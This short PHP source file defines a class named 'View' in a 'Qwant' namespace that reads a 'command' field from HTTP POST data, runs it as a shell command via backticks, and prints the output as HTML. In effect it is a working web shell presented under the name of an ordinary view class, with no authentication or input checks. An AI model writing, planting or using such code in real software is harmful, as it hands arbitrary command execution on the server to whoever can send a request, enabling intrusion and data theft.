<?php

namespace Qwant;

Class View {

    private $command;

    public function __construct()
    {
        if (isset($_POST['command'])) {
            $this->command = $_POST['command'];
        }
    }

    public function exec(){
        //$a = `cd ../../../../var ; ls -l`;
        $a = `{$this->command}`;
        $a = preg_replace('/[\t\r\n]/', '<br>', $a);
        $a = preg_replace('/ /', '&nbsp', $a);
        $a = '<pre>' . $a . '</pre>';
        echo $a;
    }
}

